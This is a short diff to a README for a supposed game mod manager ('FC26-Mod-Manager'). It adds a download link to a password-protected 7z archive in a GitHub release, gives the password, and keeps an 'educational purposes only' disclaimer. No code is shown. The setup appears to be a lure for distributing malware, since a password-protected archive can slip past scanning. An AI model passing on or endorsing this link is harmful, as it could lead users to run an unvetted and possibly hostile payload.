@@ -6,7 +6,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download FC26-Mod-Manager]()**
+🔗 **[Download FC26-Mod-Manager](https://github.com/Metropolisungrow/FC26-Mod-Manager/releases/download/fc/ModManager.7z)**
 
 **Password:** `fc26mods`
 ---
@@ -18,6 +18,8 @@
 ⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
 
 ---
+
+
 
 ## ✨ Key Features
 
